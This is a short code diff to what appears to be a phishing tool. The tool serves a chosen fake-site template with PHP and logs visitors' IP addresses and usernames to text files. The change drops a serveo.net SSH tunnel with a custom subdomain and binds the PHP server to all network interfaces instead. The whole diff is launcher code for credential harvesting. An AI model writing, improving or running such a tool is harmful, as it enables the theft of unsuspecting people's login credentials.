@@ -97,11 +97,8 @@ Please Choose A Number To Host Template:
         pass
     choice = templates[number]
     print("Loading %s" % (choice))
-    print("\nEnter A Custom Subdomain")
-    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:3333 & ssh -R %s.serveo.net:80:127.0.0.1:3333 serveo.net" % (choice, subdom)
+    cmd_line = "sudo php -t sites/%s -S 0.0.0.0:3333" % (choice)
     p = subprocess.Popen(cmd_line, shell=True)
     out = p.communicate()[0]
 
